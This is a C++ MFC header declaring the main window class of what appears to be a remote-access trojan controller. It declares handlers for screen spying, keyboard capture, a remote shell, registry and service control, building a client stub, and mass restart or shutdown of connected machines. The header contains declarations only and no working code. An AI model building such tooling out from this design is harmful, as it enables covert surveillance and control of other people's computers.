// MainFrm.h : interface of the CMainFrame class
//


#pragma once

#include "GroupDlg.h"

class CMainFrame : public CXTPFrameWnd
{

protected: // create from serialization only
	CMainFrame();
	DECLARE_DYNCREATE(CMainFrame)

// Attributes
public:

// Operations
public:
	void OnReboot();
	void Activate(UINT nPort);
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	static void ProcessReceiveComplete(ClientContext *pContext);
	static void ProcessReceive(ClientContext *pContext);
// Overrides
public:
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
// Implementation
public:
	virtual ~CMainFrame();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:  // control bar embedded members
	CXTPStatusBar  m_wndStatusBar;
	CXTPTrayIcon m_TrayIcon;
	CXTPDockingPaneManager m_paneManager;
	CXTPMessageBar m_wndMessageBar;
	CGroupDlg m_paneGroup;
	BOOL CreateStatusBar();
	BOOL CreateRibbonBar();
	BOOL CreateMessageBar();
	void CreateDockingPane();
	void LoadOfficeIcons();
	void SwitchToForm(int nForm);
// 	afx_msg void OnManagerHideall();
// 	afx_msg void OnManagerShowall();
	void SetCommandBarsTheme(XTPPaintTheme paintTheme, HMODULE hModule=NULL, LPCTSTR lpszINI=NULL);
#ifdef _XTP_INCLUDE_DOCKINGPANE
	void SetDockingPaneTheme(XTPDockingPanePaintTheme nTheme, int nMargin = 0);
#endif
	XTPToolTipStyle GetToolTipStyle() const;
	CXTPRibbonBar* pRibbonBar;
// Generated message map functions
protected:
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnOptionsStyle(UINT nStyle);
	afx_msg void OnUpdateOptionsStyle(CCmdUI* pCmdUI);
	afx_msg void OnOptionsFont(UINT nID);
	afx_msg void OnUpdateOptionsFont(CCmdUI* pCmdUI);
	afx_msg void OnFrameTheme();
	afx_msg void OnUpdateFrameTheme(CCmdUI* pCmdUI);
	UINT m_nRibbonStyle;

	afx_msg LRESULT OnAddToList(WPARAM, LPARAM);
	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenManagerDialog(WPARAM /*wParam*/, LPARAM /*lParam*/);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenKeyBoardDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenServiceDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenRegeditDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenUrlDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	DECLARE_MESSAGE_MAP()
public:
	CString m_strUser;
	CString m_strToken;
    afx_msg void OnClose();
	afx_msg void OnMenuitemShow();
	afx_msg void OnMenuitemHide();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnFileBuild();
	afx_msg void OnFileSetting();
	afx_msg void OnBatchLogout();
	afx_msg void OnBatchRestart();
	afx_msg void OnBatchShut();
	afx_msg void OnBatchSelectAll();
	afx_msg void OnBatchUnselect();
	afx_msg void OnFileUser();
	afx_msg void OnListFile();
	afx_msg void OnListPm();
	afx_msg void OnListSystem();
	afx_msg void OnListService();
	afx_msg void OnListSysinfo();
	afx_msg void OnListKeyboard();
	afx_msg void OnListRegedit();
	afx_msg void OnListBatch();
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnAppExit();
};
